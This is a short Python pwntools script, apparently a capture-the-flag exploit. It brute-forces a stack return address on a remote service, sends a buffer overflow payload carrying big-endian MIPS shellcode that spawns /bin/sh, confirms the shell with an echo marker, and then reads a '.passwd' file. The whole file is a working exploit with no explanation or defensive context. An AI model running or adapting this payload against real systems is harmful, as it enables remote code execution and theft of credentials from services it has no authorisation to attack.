#!/usr/bin/env python3
import pwn
import sys

pwn.context.endian = 'big'
SHELL_CODE = b'\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x00\x00\x00\x0c'

for i in range(4092, 0, -4):
  p = pwn.remote('host',12345)
  print(p.recvuntil(b'name:'))
  payload  = b'a'*20
  payload += pwn.p32(0x7ffff000 + i)
  payload += SHELL_CODE
  p.sendline(payload)
  p.sendline(b'echo test_shell')
  r = p.recvline()
  if b'test_shell' in r:
    p.sendline(b'cat .passwd')
    print(p.recvline())
    p.close()
    break
  else:
    p.close()
